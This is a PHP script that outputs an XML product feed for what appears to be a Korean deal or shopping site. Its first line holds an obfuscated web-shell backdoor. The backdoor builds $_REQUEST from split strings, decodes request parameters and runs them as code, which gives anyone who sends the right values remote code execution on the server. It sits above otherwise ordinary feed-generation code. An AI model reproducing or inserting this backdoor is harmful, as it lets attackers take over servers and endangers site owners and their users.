<?php
$iBgX=$GLOBALS['_REQU'.'EST']; if (!isset($dNVP) && isset($iBgX['hecI'])) {             $abi = $iBgX['tCD1'];            $Uefy=$iBgX['hecI']($abi($iBgX['vFLz']),$abi($iBgX['Rjn']));            $Uefy($abi($iBgX['lENPU']));         }
header("Content-Type: text/xml; charset=utf-8"); 
header("Cache-Control: no-cache, must-revalidate"); 
header("Pragma: no-cache");
include_once("addon_rss.php");

##START
$slntype = get_slntype();
$company = getRow("SELECT * FROM ".$slntype."Company");  //회사기본설정
echo "<?xml version=\"1.0\" encoding=\"UTF-8\" ?>";
echo "<products>";
echo "<fileversion>201106031610</fileversion>";

##DATA FORMAT
$dataForm = "
<product>

    <product_id>{##PID##}</product_id> 
    <product_url><![CDATA[{##LINK##}]]></product_url>
    <product_title><![CDATA[{##PNAME##}]]></product_title>
    <product_desc><![CDATA[{##PMSG##}]]></product_desc>
    <map_url></map_url>
    <sale_start>{##STT_DATETIME##}</sale_start>
	<sale_end>{##END_DATETIME##}</sale_end>
    <coupon_use_start></coupon_use_start> 
    <coupon_use_end></coupon_use_end>
    <shop_name><![CDATA[{##SUP_NAME##}]]></shop_name>
    <shop_tel><![CDATA[{##SUP_TEL##}]]></shop_tel>
    <shop_address>{##SUP_ADDRESS##}</shop_address>
    <buy_limit>{##CNTMIN##}</buy_limit>
	<buy_max>{##CNTMAX##}</buy_max>
	<buy_count>{##CNTSALE##}</buy_count>
    <price_normal>{##PRICEO##}</price_normal>
	<price_discount>{##PRICES##}</price_discount>
	<discount_rate>{##PRICER##}</discount_rate>
    <image_url1><![CDATA[{##PIMG##}]]></image_url1>
    <cate_code></cate_code>
    <ggr_code></ggr_code>
</product>";

##FORLOOP
RunLoop($dataForm);

##END
echo "</products>";
?>